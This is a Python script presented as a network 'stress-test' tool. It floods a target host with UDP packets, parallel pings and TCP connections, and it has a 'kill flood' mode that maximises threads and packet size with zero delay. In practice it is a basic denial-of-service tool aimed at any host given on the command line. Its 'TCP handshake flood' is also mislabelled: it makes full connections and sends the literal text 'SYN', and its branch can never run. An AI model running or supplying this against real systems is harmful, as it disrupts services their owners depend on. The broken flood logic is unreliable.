import socket
import subprocess
import time
import concurrent.futures
import argparse

def send_udp_packet(target_host, target_port, packet_size):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generate a large packet with random data (e.g., 1024 bytes)
    data = b'X' * packet_size

    udp_socket.sendto(data, (target_host, target_port))

    udp_socket.close()

def udp_stress_test(target_host, target_port, packet_size, num_packets, delay, num_threads):
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_packets):
            executor.submit(send_udp_packet, target_host, target_port, packet_size)
            time.sleep(delay)

def ping_host(host, num_packets, timeout):
    try:
        # Use the 'ping' command with the specified number of packets and timeout
        subprocess.run(['ping', '-c', str(num_packets), '-W', str(timeout), host], check=True)
        print(f"Ping to {host} successful!")
    except subprocess.CalledProcessError:
        print(f"Failed to ping {host}.")

def parallel_ping(target_host, num_packets, timeout, num_threads):
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(ping_host, target_host, num_packets, timeout) for _ in range(num_threads)]
        concurrent.futures.wait(futures)

def tcp_stress_test(target_host, target_port, num_connections, num_threads):
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(connect_tcp_socket, target_host, target_port) for _ in range(num_connections)]
        concurrent.futures.wait(futures)

def connect_tcp_socket(target_host, target_port):
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        tcp_socket.connect((target_host, target_port))
        tcp_socket.close()
        print(f"TCP connection to {target_host}:{target_port} successful!")
    except Exception as e:
        print(f"Failed to connect to {target_host}:{target_port}. Error: {e}")

def tcp_flood_handshake(target_host, target_port, num_connections, num_threads):
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(partial_handshake, target_host, target_port) for _ in range(num_connections)]
        concurrent.futures.wait(futures)

def partial_handshake(target_host, target_port):
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        tcp_socket.connect((target_host, target_port))
        tcp_socket.send(b"SYN")
        tcp_socket.close()
    except Exception as e:
        pass

def parse_args():
    parser = argparse.ArgumentParser(description="Script for stress-testing a target host using UDP, ICMP, or TCP.")
    parser.add_argument("test_type", choices=['udp', 'icmp', 'tcp', 'all'], help="Stress-test type (UDP, ICMP, TCP, or ALL)")
    parser.add_argument("target_host", help="Target host IP address")
    parser.add_argument("-n", "--num_threads", type=int, default=5, help="Number of threads for parallel processing")
    parser.add_argument("-d", "--delay", type=float, default=0.1, help="Delay between packets (seconds)")
    parser.add_argument("-p", "--packet_size", type=int, default=1024, help="Packet size for UDP (bytes)")
    parser.add_argument("-x", "--num_packets_udp", type=int, default=100, help="Number of UDP packets to send")
    parser.add_argument("-e", "--timeout_icmp", type=float, default=1.0, help="ICMP test timeout (seconds)")
    parser.add_argument("-o", "--num_packets_icmp", type=int, default=5, help="Number of ICMP packets to send")
    parser.add_argument("-m", "--num_connections_tcp", type=int, default=10, help="Number of TCP connections to make")
    parser.add_argument("-r", "--target_port_udp", type=int, default=5000, help="Target port number for UDP")
    parser.add_argument("-a", "--target_port_tcp", type=int, default=80, help="Target port number for TCP")
    parser.add_argument("--kill", choices=['flood'], help="Kill stress test using maximum values")
    parser.add_argument("--tcp_flood_handshake", action="store_true", help="Perform TCP handshake flood")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()

    if args.kill == "flood":
        args.test_type = "all"
        args.num_threads = 100
        args.packet_size = 65535
        args.num_packets_udp = 5000
        args.delay = 0

    if args.test_type == "all":
        udp_stress_test(args.target_host, args.target_port_udp, args.packet_size, args.num_packets_udp, args.delay, args.num_threads)
        parallel_ping(args.target_host, args.num_packets_icmp, args.timeout_icmp, args.num_threads)
        tcp_stress_test(args.target_host, args.target_port_tcp, args.num_connections_tcp, args.num_threads)
    elif args.test_type == "udp":
        udp_stress_test(args.target_host, args.target_port_udp, args.packet_size, args.num_packets_udp, args.delay, args.num_threads)
    elif args.test_type == "icmp":
        parallel_ping(args.target_host, args.num_packets_icmp, args.timeout_icmp, args.num_threads)
    elif args.test_type == "tcp":
        tcp_stress_test(args.target_host, args.target_port_tcp, args.num_connections_tcp, args.num_threads)
    elif args.tcp_flood_handshake:
        tcp_flood_handshake(args.target_host, args.target_port_tcp, args.num_connections_tcp, args.num_threads)
